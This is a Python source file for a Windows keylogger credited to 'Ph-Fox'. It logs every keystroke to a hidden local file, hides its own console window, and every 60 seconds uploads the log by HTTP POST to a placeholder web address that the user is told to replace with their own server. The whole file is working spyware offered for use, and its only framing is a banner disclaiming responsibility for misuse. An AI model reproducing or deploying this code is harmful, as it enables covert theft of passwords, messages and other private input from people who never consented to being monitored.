import requests, time, threading
from pynput import keyboard
import win32gui, win32con

def upload():
	while True:
		url = 'http://example.com/logz/logger.php' # <------- Replace this with your website
		f = open('.logz.txt')
		logz = f.read()
		r = requests.post(url, data={'klogz':logz})
		f.close()
		time.sleep(60)

def save(key):
	f = open('.logz.txt','a')
	if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
		f.write('<Ctrl> \n')
	elif key == keyboard.Key.esc:
		f.write('<Esc> \n')
	elif key == keyboard.Key.space:
		f.write(' \n')
	elif key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
		f.write('<Shift> \n')
	elif key == keyboard.Key.backspace:
		f.write('<Backspace> \n')
	elif key == keyboard.Key.enter:
		f.write('<Enter> \n')
	elif key == keyboard.Key.tab:
		f.write('<Tab> \n')
	elif key == keyboard.Key.caps_lock:
		f.write('<CapsLk> \n')
	elif key == keyboard.Key.cmd:
		f.write('<Cmd/Win> \n')
	elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
		f.write('<Alt> \n')
	elif key == keyboard.Key.menu:
		f.write('<menu> \n')
	elif key == keyboard.Key.left:
		f.write('<Left> \n')
	elif key == keyboard.Key.right:
		f.write('<Right> \n')
	elif key == keyboard.Key.down:
		f.write('<Down> \n')
	elif key == keyboard.Key.up:
		f.write('<Up> \n')
	elif key == keyboard.Key.insert:
		f.write('<Insert> \n')
	elif key == keyboard.Key.delete:
		f.write('<Del> \n')
	elif key == keyboard.Key.home:
		f.write('<Home> \n')
	elif key == keyboard.Key.end:
		f.write('<End> \n')
	elif key == keyboard.Key.page_down:
		f.write('<PageDown> \n')
	elif key == keyboard.Key.page_up:
		f.write('<PageUp> \n')
	elif key == keyboard.Key.print_screen:
		f.write('<PrintScreen> \n')
	elif key == keyboard.Key.scroll_lock:
		f.write('<ScrlLk> \n')
	elif key == keyboard.Key.pause:
		f.write('<Pause> \n')
	elif key == keyboard.Key.num_lock:
		f.write('<NumLk> \n')
	elif key == keyboard.Key.f1:
		f.write('<f1> \n')
	elif key == keyboard.Key.f2:
		f.write('<f2> \n')
	elif key == keyboard.Key.f3:
		f.write('<f3> \n')
	elif key == keyboard.Key.f4:
		f.write('<f4> \n')
	elif key == keyboard.Key.f5:
		f.write('<f5> \n')
	elif key == keyboard.Key.f6:
		f.write('<f6> \n')
	elif key == keyboard.Key.f7:
		f.write('<f7> \n')
	elif key == keyboard.Key.f8:
		f.write('<f8> \n')
	elif key == keyboard.Key.f9:
		f.write('<f9> \n')
	elif key == keyboard.Key.f10:
		f.write('<f10> \n')
	elif key == keyboard.Key.f11:
		f.write('<f11> \n')
	elif key == keyboard.Key.f12:
		f.write('<f12> \n')
	else:
		f.write(str(key).replace("'",""))
	f.close()

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def on_release(key):
    print('{0} released'.format(key))
    save(key)
    if key == keyboard.Key.esc:
    	pass
        #return False


print("""
╔――――――――――――――――――――――――――――――――――――――――――――――╗
╟  ╔═╗┬ ┬ ╔═╗┌─┐─┐ ┬  ╦╔═   ╦  ┌─┐┌─┐┌─┐┌─┐┬─┐ ╢
╟  ╠═╝├─┤ ╠╣ │ │┌┴┬┘  ╠╩╗───║  │ ││ ┬│ ┬├┤ ├┬┘ ╢
╟  ╩  ┴ ┴o╚  └─┘┴ └─  ╩ ╩   ╩═╝└─┘└─┘└─┘└─┘┴└─ ╢
╟  By: Ph-Fox                                  ╢
╟ Note:                                        ╢
╟   I am no longer responsible                 ╢
╟   for any misuse of this tool.               ╢
╚――――――――――――――――――――――――――――――――――――――――――――――╝
""")
print("Starting..")
time.sleep(5)
winz = win32gui.GetForegroundWindow()
win32gui.ShowWindow(winz, win32con.SW_HIDE)
threading.Thread(target=upload).start()

with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
	listener.join()

listener = keyboard.Listener(on_press=on_press,on_release=on_release)
listener.start()
